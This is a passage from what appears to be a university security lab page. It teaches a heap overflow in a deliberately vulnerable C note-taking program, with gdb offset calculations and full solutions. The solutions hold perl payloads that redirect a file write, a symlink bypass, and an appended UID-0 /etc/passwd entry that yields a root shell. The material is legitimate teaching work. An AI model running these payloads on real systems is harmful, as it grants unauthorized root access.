<h2>Exercise<a class="headerlink" href="#exercise" title="Permalink to this headline">¶</a></h2>
<div class="section" id="finding-vulnerable-code">
<h3>Finding vulnerable code<a class="headerlink" href="#finding-vulnerable-code" title="Permalink to this headline">¶</a></h3>
<p>❓ <strong>Can you spot which line of code is vulnerable to a heap-based overflow
?</strong></p>
<div class="admonition hint">
<p class="first admonition-title">Hint</p>
<p class="last"><strong>💡 Don’t forget how the memory is based and the difference
between the stack and the heap.</strong></p>
</div>
<div class="collapse tp1_s0" id="tp1_0_2">
       <div class="panel panel-primary">
     <div class="panel-body"><p>We have seen that we created a new file but how useful is that? There
are a few files that are useful to gain more privileges. For examples
let’s say we grant privileges to users via the <code class="docutils literal notranslate"><span class="pre">/etc/sudoers</span></code> file or
even that we add a new user with root privileges to the <code class="docutils literal notranslate"><span class="pre">/etc/passwd</span></code>
file. In this case we will do the later one.</p>
<p>We can see that the vulnerability happens on the line <strong>strcpy(buffer,
argv[1]);</strong>. Without checking the length of the argument, we can
overflow the first buffer and write on the second buffer <em>datafile</em>.</p>
<div class="code C highlight-default notranslate"><div class="highlight"><pre><span></span><span class="nb">int</span> <span class="n">main</span><span class="p">(</span><span class="nb">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
  <span class="nb">int</span> <span class="n">userid</span><span class="p">,</span> <span class="n">fd</span><span class="p">;</span> <span class="o">//</span> <span class="n">File</span> <span class="n">descriptor</span>
  <span class="n">char</span> <span class="o">*</span> <span class="n">buffer</span><span class="p">,</span> <span class="o">*</span><span class="n">datafile</span><span class="p">;</span>

  <span class="n">buffer</span> <span class="o">=</span> <span class="p">(</span><span class="n">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">buffer</span> <span class="o">==</span> <span class="n">NULL</span><span class="p">)</span>
    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

  <span class="n">datafile</span> <span class="o">=</span> <span class="p">(</span><span class="n">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">20</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">datafile</span> <span class="o">==</span> <span class="n">NULL</span><span class="p">)</span>
    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">datafile</span><span class="p">,</span> <span class="s2">&quot;/var/notes&quot;</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s2">&quot;Usage : ./note-taker </span><span class="se">\&#39;</span><span class="s2">Some very interesting message</span><span class="se">\&#39;\n</span><span class="s2">&quot;</span><span class="p">);</span>
    <span class="k">return</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</pre></div>
</div>
</div>
</div>
</div></div>
<div class="section" id="locate-the-heap-in-memory">
<h3>Locate the heap in memory<a class="headerlink" href="#locate-the-heap-in-memory" title="Permalink to this headline">¶</a></h3>
<p>It is often usefull to take a look at the heap’s memory to debug. In
this case we want to see where in memory the <em>datafile</em> and <em>buffer</em>
variables are located. (We assume that we don’t print any DEBUG
information)</p>
<p>❓ <strong>Using</strong> <code class="docutils literal notranslate"><span class="pre">gdb</span></code>  <strong>can you find a way to locate the address of the heap?</strong></p>
<div class="admonition hint">
<p class="first admonition-title">Hint</p>
<p class="last"><strong>💡 You can put a breakpoint somewhere in the program and see the
state of the registers as well as other usefull information regarding
the stack and the heap. Once you find the heap you can take a look at
its content easily.</strong></p>
</div>
<div class="collapse tp1_s0" id="tp1_0_3">
       <div class="panel panel-primary">
     <div class="panel-body"><p>We can use gdb to locate the heap and the two buffers. First we need to
find a place to put a breakpoint. Line 26 is a perfect place</p>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span>$ gdb -q note_taker
(gdb) list main,26
8   int main(int argc, char* argv[]){
9     int userid, fd; // File descriptor
10    char * buffer, *datafile;
11
12    buffer = (char *) malloc(100);
13    if (buffer == NULL)
14      return -1;
15
16    datafile = (char *) malloc(20);
17    if (datafile == NULL)
18      return -1;
19    strcpy(datafile, &quot;/var/notes&quot;);
20
21    if (argc &lt; 2){
22      printf(&quot;Usage : ./note-taker \&#39;Some very interesting message\&#39;\n&quot;);
23      return-1;
24    }
25    strcpy(buffer, argv[1]);
26
(gdb) b 26
Breakpoint 1 at 0x8049294: file note_taker.c, line 27.
$
</pre></div>
</div>
<p>We can now run the program with a recognizable input like <em>AAAA</em> and
examine memory.</p>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">run</span> <span class="n">AAAA</span>
<span class="p">[</span><span class="o">...</span><span class="p">]</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">info</span> <span class="n">proc</span> <span class="nb">map</span>
<span class="n">process</span> <span class="mi">7668</span>
<span class="n">Mapped</span> <span class="n">address</span> <span class="n">spaces</span><span class="p">:</span>

    <span class="n">Start</span> <span class="n">Addr</span>   <span class="n">End</span> <span class="n">Addr</span>       <span class="n">Size</span>     <span class="n">Offset</span> <span class="n">objfile</span>
     <span class="mh">0x8048000</span>  <span class="mh">0x804b000</span>     <span class="mh">0x3000</span>        <span class="mh">0x0</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="o">/</span><span class="n">Documents</span><span class="o">/</span><span class="n">Security</span><span class="o">/</span><span class="n">LINGI2144</span><span class="o">-</span><span class="mi">2020</span><span class="o">-</span><span class="mi">2022</span><span class="o">/</span><span class="n">heap</span><span class="o">-</span><span class="n">exploit</span><span class="o">/</span><span class="n">file_writer</span><span class="o">/</span><span class="n">note_taker</span>
     <span class="mh">0x804b000</span>  <span class="mh">0x804c000</span>     <span class="mh">0x1000</span>     <span class="mh">0x2000</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="o">/</span><span class="n">Documents</span><span class="o">/</span><span class="n">Security</span><span class="o">/</span><span class="n">LINGI2144</span><span class="o">-</span><span class="mi">2020</span><span class="o">-</span><span class="mi">2022</span><span class="o">/</span><span class="n">heap</span><span class="o">-</span><span class="n">exploit</span><span class="o">/</span><span class="n">file_writer</span><span class="o">/</span><span class="n">note_taker</span>
     <span class="mh">0x804c000</span>  <span class="mh">0x804d000</span>     <span class="mh">0x1000</span>     <span class="mh">0x3000</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="o">/</span><span class="n">Documents</span><span class="o">/</span><span class="n">Security</span><span class="o">/</span><span class="n">LINGI2144</span><span class="o">-</span><span class="mi">2020</span><span class="o">-</span><span class="mi">2022</span><span class="o">/</span><span class="n">heap</span><span class="o">-</span><span class="n">exploit</span><span class="o">/</span><span class="n">file_writer</span><span class="o">/</span><span class="n">note_taker</span>
     <span class="mh">0x804d000</span>  <span class="mh">0x806f000</span>    <span class="mh">0x22000</span>        <span class="mh">0x0</span> <span class="p">[</span><span class="n">heap</span><span class="p">]</span>
    <span class="mh">0xb7dd7000</span> <span class="mh">0xb7fb5000</span>   <span class="mh">0x1de000</span>        <span class="mh">0x0</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mf">2.30</span><span class="o">.</span><span class="n">so</span>
    <span class="mh">0xb7fb5000</span> <span class="mh">0xb7fb7000</span>     <span class="mh">0x2000</span>   <span class="mh">0x1dd000</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mf">2.30</span><span class="o">.</span><span class="n">so</span>
    <span class="mh">0xb7fb7000</span> <span class="mh">0xb7fb9000</span>     <span class="mh">0x2000</span>   <span class="mh">0x1df000</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mf">2.30</span><span class="o">.</span><span class="n">so</span>
    <span class="mh">0xb7fb9000</span> <span class="mh">0xb7fbb000</span>     <span class="mh">0x2000</span>        <span class="mh">0x0</span>
    <span class="mh">0xb7fd0000</span> <span class="mh">0xb7fd2000</span>     <span class="mh">0x2000</span>        <span class="mh">0x0</span>
    <span class="mh">0xb7fd2000</span> <span class="mh">0xb7fd5000</span>     <span class="mh">0x3000</span>        <span class="mh">0x0</span> <span class="p">[</span><span class="n">vvar</span><span class="p">]</span>
    <span class="mh">0xb7fd5000</span> <span class="mh">0xb7fd6000</span>     <span class="mh">0x1000</span>        <span class="mh">0x0</span> <span class="p">[</span><span class="n">vdso</span><span class="p">]</span>
    <span class="mh">0xb7fd6000</span> <span class="mh">0xb7ffe000</span>    <span class="mh">0x28000</span>        <span class="mh">0x0</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="mf">2.30</span><span class="o">.</span><span class="n">so</span>
    <span class="mh">0xb7ffe000</span> <span class="mh">0xb7fff000</span>     <span class="mh">0x1000</span>    <span class="mh">0x27000</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="mf">2.30</span><span class="o">.</span><span class="n">so</span>
    <span class="mh">0xb7fff000</span> <span class="mh">0xb8000000</span>     <span class="mh">0x1000</span>    <span class="mh">0x28000</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="mf">2.30</span><span class="o">.</span><span class="n">so</span>
    <span class="mh">0xbffdf000</span> <span class="mh">0xc0000000</span>    <span class="mh">0x21000</span>        <span class="mh">0x0</span> <span class="p">[</span><span class="n">stack</span><span class="p">]</span>
</pre></div>
</div>
<p>We find that the heap is located at the address <strong>0x804d000</strong>. We can
then take a look at its memory.</p>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">120</span><span class="n">x</span> <span class="mh">0x804d000</span>
<span class="p">[</span><span class="o">...</span><span class="p">]</span>
<span class="mh">0x804d190</span><span class="p">:</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000071</span>
<span class="mh">0x804d1a0</span><span class="p">:</span>  <span class="mh">0x41414141</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
<span class="mh">0x804d1b0</span><span class="p">:</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</pre></div>
</div>
</div>
</div>
</div></div>
<div class="section" id="locate-the-two-buffers">
<h3>Locate the two buffers<a class="headerlink" href="#locate-the-two-buffers" title="Permalink to this headline">¶</a></h3>
<p><strong>Using</strong> <code class="docutils literal notranslate"><span class="pre">gdb</span></code> <strong>can you locate the address of the two buffers?</strong></p>
<div class="admonition hint">
<p class="first admonition-title">Hint</p>
<p class="last"><strong>💡 You may want to use some distinguishable input
(“AAAABBBBCCCC”, “ABCDEFGH”, …) that you can spot easily while looking
at the memory.</strong></p>
</div>
<p>Once you have found the two buffers in memory you can calculate the
length needed to overflow the buffer into the datafile.</p>
<p>❓ <strong>Using</strong> <code class="docutils literal notranslate"><span class="pre">gdb</span></code>  <strong>find the number of bytes needed to overflow the second
buffer.</strong></p>
<div class="admonition warning">
<p class="first admonition-title">Warning</p>
<p class="last"><strong>When using</strong> <code class="docutils literal notranslate"><span class="pre">gdb</span></code> <strong>to compute values using addresses, it
might sometime display the result in hexadecimal value.</strong></p>
</div>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span>(gdb) p 0xdeadbeef - 0xdeadbeaf
$1 = 0x40
(gdb) p/d 0xdeadbeef - 0xdeadbeaf
$2 = 64
</pre></div>
</div>
<div class="collapse tp1_s0" id="tp1_0_4">
       <div class="panel panel-primary">
     <div class="panel-body"><p>We have found that our buffer variable is located at address
<strong>0x804d1a0</strong> and if we continue a bit further we find the datafile
variable located at address <strong>0x804d210</strong>.</p>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span>
<span class="mh">0x804d200</span><span class="p">:</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000021</span>
<span class="mh">0x804d210</span><span class="p">:</span>  <span class="mh">0x7261762f</span>  <span class="mh">0x746f6e2f</span>  <span class="mh">0x00007365</span>  <span class="mh">0x00000000</span>
<span class="mh">0x804d220</span><span class="p">:</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00021dd9</span>
</pre></div>
</div>
<p>We can then calculate the offset between the two locations :</p>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span>(gdb) p/d 0x804d210 - 0x804d1a0
$1 = 112
</pre></div>
</div>
</div>
</div>
</div></div>
<div class="section" id="predicting-the-file-name">
<h3>Predicting the file name<a class="headerlink" href="#predicting-the-file-name" title="Permalink to this headline">¶</a></h3>
<p>Now that you now how much bytes you need for the padding you should be
able to write to a file of your choice.</p>
<p>❓ <strong>Try writing to the file</strong> <code class="docutils literal notranslate"><span class="pre">/var/test</span></code>.</p>
<div class="admonition hint">
<p class="first admonition-title">Hint</p>
<p class="last"><strong>💡 You can use perl or python to generate long strings.</strong></p>
</div>
<p>You can look at the result using <code class="docutils literal notranslate"><span class="pre">sudo</span> <span class="pre">cat</span> <span class="pre">/var/test</span></code></p>
<p>❓ <strong>Now try to fit a non-rubish sentence in this file.</strong></p>
<div class="admonition hint">
<p class="first admonition-title">Hint</p>
<p class="last"><strong>💡 *You might need to change the padding depending on your sentence length.</strong></p>
</div>
<div class="collapse tp1_s0" id="tp1_0_5">
       <div class="panel panel-primary">
     <div class="panel-body"><p>Since in the last try we printed 120 characters and the last 8 bytes
were overflowing the datafile variable, we can assume that we need to
fill 112 bytes before our file name.</p>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span>$ ./note_taker $(perl -e &#39;print &quot;A&quot;x112 . &quot;/var/test&quot;&#39;)
[DEBUG] buffer @ 0x804d1a0: &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/var/test&#39;
[DEBUG] datafile @ 0x804d210: &#39;/var/test&#39;
Note has been saved.
double free or corruption (out)
Aborted
$
</pre></div>
</div>
<p>As expected the correct filename is displayed.</p>
</div>
</div>
</div><?php
      if($good) {
         //nothing
      } else {
         echo '<script type="text/javascript">',
                  'updateSol("tp1_0_0 tp1_0_1 tp1_0_2 tp1_0_3 tp1_0_4 tp1_0_5",".tp1_s0","predicting-the-file-name");',
               '</script>';
         include "../_static/solution.html";
      }
?></div>
</div>
<div class="section" id="gaining-root-access">
<h2>Gaining root access<a class="headerlink" href="#gaining-root-access" title="Permalink to this headline">¶</a></h2>
<p>In this section we will see how to gain root privileges by creating a
new user in the <code class="docutils literal notranslate"><span class="pre">/etc/passwd</span></code> file.</p>
<div class="admonition warning">
<p class="first admonition-title">Warning</p>
<p class="last"><strong>To prevent you from breaking your VM we will first try
the exploit on the file</strong> <code class="docutils literal notranslate"><span class="pre">/var/passwd</span></code> <strong>first.</strong></p>
</div>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span>$ cp /etc/passwd /tmp/passwd.bkup
$
</pre></div>
</div>
<div class="section" id="create-a-new-user">
<h3>Create a new user<a class="headerlink" href="#create-a-new-user" title="Permalink to this headline">¶</a></h3>
<p>Let’s examine what the <code class="docutils literal notranslate"><span class="pre">/etc/passwd</span></code> file looks like :</p>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span>$ head /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
$
</pre></div>
</div>
<p>The format is described here <a href="#id1"><span class="problematic" id="id2">`/etc/passwd file format&lt;https://www.ibm.com/support/knowledgecenter/en/ssw_aix_71/security/passwords_etc_passwd_file.html&gt;`_</span></a></p>
<p>The important informations here are the user ID number (UID) and the
login shell. Any entry in this file that has a user ID of 0 has root
privileges so that’s what we are aiming for. We can also define our own
password but first we need to encrypt it.</p>
<p>❓ <strong>Find by yourself what is the format of this file. What information do
you think can be usefull to gain root privileges?</strong></p>
<p>❓ <strong>Write down (on paper or anywhere else) what you would need to write to
create a new user with root privileges that spawn a shell upon login.</strong></p>
<div class="admonition hint">
<p class="first admonition-title">Hint</p>
<p class="last"><strong>💡 The</strong> <code class="docutils literal notranslate"><span class="pre">x</span></code> <strong>field means that the password are stored in the</strong>
<code class="docutils literal notranslate"><span class="pre">/etc/shadow</span></code> <strong>file. We can however put an encrypted password. With
perl you can generate a encrypted password with the following command.</strong></p>
</div>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span>$ perl -e &#39;print crypt(&quot;password&quot;, &quot;AA&quot;) . &quot;\n&quot;&#39; # &quot;AA&quot; is the salt value, don&#39;t worry about it too much
AA6tQYSfGxd/A
$
</pre></div>
</div>
<p>Your string should look like something like this :</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">hackerman</span><span class="p">:</span><span class="n">AA6tQYSfGxd</span><span class="o">/</span><span class="n">A</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">me</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span><span class="s2">&quot;</span>
</pre></div>
</div>
<p>❓ <strong>At this point the string does not end with the correct sequence has it
would write to</strong> <code class="docutils literal notranslate"><span class="pre">/bin/bash</span></code> <strong>instead of</strong> <code class="docutils literal notranslate"><span class="pre">/etc/passwd</span></code>. We can however
use a clever bypass by using symbolic file link. We can create any file
ending with <code class="docutils literal notranslate"><span class="pre">/etc/passwd</span></code> (eg: <code class="docutils literal notranslate"><span class="pre">/var/etc/passwd</span></code>,
<code class="docutils literal notranslate"><span class="pre">/tmp/etc/passwd</span></code>) and link it to <code class="docutils literal notranslate"><span class="pre">/bin/bash</span></code>.</p>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span>$ mkdir /tmp/var
$ ln -s /bin/bash /tmp/var/passwd
$ ls -l /tmp/var/passwd
lrwxrwxrwx 1 kali kali 9 Jul 21 11:29 /tmp/var/passwd -&gt; /bin/bash
$
</pre></div>
</div>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last"><strong>When testing your exploit on</strong> <code class="docutils literal notranslate"><span class="pre">/etc/passwd</span></code> <strong>you just need to
replace every occurrences of</strong> <code class="docutils literal notranslate"><span class="pre">/var/passwd</span></code> <strong>by</strong> <code class="docutils literal notranslate"><span class="pre">/etc/passwd</span></code>.</p>
</div>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span>$ mkdir /tmp/etc
$ ln -s /bin/bash /tmp/etc/passwd
$ ls -l /tmp/etc/passwd
lrwxrwxrwx 1 kali kali 9 Jul 21 11:29 /tmp/etc/passwd -&gt; /bin/bash
$
</pre></div>
</div>
<p>Our string now looks like this :</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">hackerman</span><span class="p">:</span><span class="n">AA6tQYSfGxd</span><span class="o">/</span><span class="n">A</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">me</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="s2">&quot;</span>
</pre></div>
</div>
<p>We just need to add some padding bytes so that the string from the
beginning till <em>/tmp</em> has the length you computed previously.</p>
<p>❓ <strong>What field do you think we can use as padding ?</strong></p>
<div class="admonition hint">
<p class="first admonition-title">Hint</p>
<p class="last"><strong>💡 You can use perl or python to generate a string and check
what length it has by using the following piped command</strong></p>
</div>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span>$ perl -e &#39;print &quot;something&quot;&#39; | wc -c
9
$
</pre></div>
</div>
<p>Once you think you padded your string correctly you can try the exploit
on the <code class="docutils literal notranslate"><span class="pre">/var/passwd</span></code> file.</p>
<p>❓ <strong>Can you append the correct user entry to the</strong> <code class="docutils literal notranslate"><span class="pre">/var/passwd</span></code> <strong>file?</strong></p>
<p>If everything works fine you can try it on the <code class="docutils literal notranslate"><span class="pre">/etc/passwd</span></code> file.
(Remember to create the correct symbolic link as explained previously)</p>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last"><strong>The program will most likely exit in a dirty fashion like</strong>
<code class="docutils literal notranslate"><span class="pre">Aborted</span></code> <strong>. Don’t worry about it too much.</strong></p>
</div>
<p>❓ <strong>Can you log in your new user account ? What privileges do you have ?</strong></p>
<div class="collapse tp1_s2" id="tp1_2_1">
       <div class="panel panel-primary">
     <div class="panel-body"><p>We can now fill the <em>full user name (GECOS)</em> field for padding so we can
adjust our buffer correctly.</p>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span>$ perl -e &#39;print &quot;hackerman:AA6tQYSfGxd/A:0:0:me:/root:/tmp&quot;&#39; | wc -c
41
$ perl -e &#39;print &quot;hackerman:AA6tQYSfGxd/A:0:0:&quot; . &quot;A&quot;x50 . &quot;:/root:/tmp&quot;&#39; | wc -c
89
$ gdb -q
(gdb) p/d 112 - 89 + 50
$1 = 73
(gdb) quit
$ perl -e &#39;print &quot;hackerman:AA6tQYSfGxd/A:0:0:&quot;.&quot;A&quot;x73 .&quot;:/root:/tmp&quot;&#39; | wc -c
112
</pre></div>
</div>
<p>We have successfully padded the buffer so now we just need to add the
file at the end of the string and it shoudl work perfectly.</p>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span>./note_taker $(perl -e &#39;print &quot;hackerman:AA6tQYSfGxd/A:0:0:&quot;.&quot;A&quot;x73 .&quot;:/root:/tmp/etc/passwd&quot;&#39;)
[DEBUG] buffer @ 0x804d1a0: &#39;hackerman:AA6tQYSfGxd/A:0:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:/root:/tmp/etc/passwd&#39;
[DEBUG] datafile @ 0x804d210: &#39;/etc/passwd&#39;
Note has been saved.
munmap_chunk(): invalid pointer
Aborted
$ tail /etc/passwd

hackerman:AA6tQYSfGxd/A:0:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:/root:/tmp/etc/passwd
$ su hackerman
Password : #password
root@kali:/home/kali# whoami
root
root@kali:/home/kali#
</pre></div>
</div>
<p>And just like so we got a brand new root access !</p>
</div>
</div>
</div><?php
      if($good) {
         //nothing
      } else {
         echo '<script type="text/javascript">',
                  'updateSol("tp1_2_1",".tp1_s2","create-a-new-user");',
               '</script>';
         include "../_static/solution.html";
      }
?></div>
</div>
<div class="section" id="bonus">
<h2>BONUS<a class="headerlink" href="#bonus" title="Permalink to this headline">¶</a></h2>
<p>One thing that could go wrong is that the buffer holding the datafile
variable (in this case <code class="docutils literal notranslate"><span class="pre">/var/notes</span></code>) is not long enough to fit an
interesting file name.</p>
<p>❓ <strong>Can you think of how to bypass this issue?</strong></p>
<div class="admonition hint">
<p class="first admonition-title">Hint</p>
<p class="last"><strong>💡 You might need the natural logarithm…</strong></p>
</div>
<div class="collapse tp1_s1" id="tp1_1_0">
       <div class="panel panel-primary">
     <div class="panel-body"><p>If the buffer for the datafile is not large enough, we may not be able
to fit the full <code class="docutils literal notranslate"><span class="pre">/etc/passwd</span></code> string length. However we can use the
same trick as for spawning a bash : symbolic file link.</p>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span>$ ln -s /etc/passwd passwd
</pre></div>
</div>
<p>We now have to change the padding so that only the last part of the file
(<code class="docutils literal notranslate"><span class="pre">passwd</span></code>) overflow the datafile buffer.</p>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span>./note_taker $(perl -e &#39;print &quot;hackermon:AA6tQYSfGxd/A:0:0:&quot;.&quot;A&quot;x68 .&quot;:/root:/tmp/etc/passwd&quot;&#39;)
[DEBUG] buffer @ 0x804d1a0: &#39;hackermon:AA6tQYSfGxd/A:0:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:/root:/tmp/etc/passwd&#39;
[DEBUG] datafile @ 0x804d210: &#39;passwd&#39;
Note has been saved.
Segmentation fault
</pre></div>
</div>
<p>The datafile correctly outputs <code class="docutils literal notranslate"><span class="pre">passwd</span></code> and if we try to change user :</p>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">su</span> <span class="n">hackermon</span>
<span class="n">Password</span> <span class="p">:</span> <span class="c1">#password</span>
<span class="n">root</span><span class="nd">@kali</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="c1"># whoami</span>
<span class="n">root</span>
<span class="n">root</span><span class="nd">@kali</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="c1">#</span>
</pre></div>
</div>
</div>
</div>
</div><?php
      if($good) {
         //nothing
      } else {
         echo '<script type="text/javascript">',
                  'updateSol("tp1_1_0",".tp1_s1","bonus");',
               '</script>';
         include "../_static/solution.html";
      }
?></div>
</div>


    </div>
      
  </div>
</div>
<footer class="footer">
  <div class="container">
    <p class="pull-right">
      <a id="up" href="#">
        <span class="fa fa-chevron-up"></span>
      </a>
      
        <br/>
        
      
    </p>
    <p>
        &copy; Copyright 2022, Legay Axel, Duchene Fabien, Crochet Christophe, Sebastien Strebelle, Thomas Given-Wilson, Schmitz Donatien.<br/>
      Created using <a href="http://sphinx-doc.org/">Sphinx</a> 1.8.5.<br/>
    </p>
  </div>
</footer>
  </body>
</html>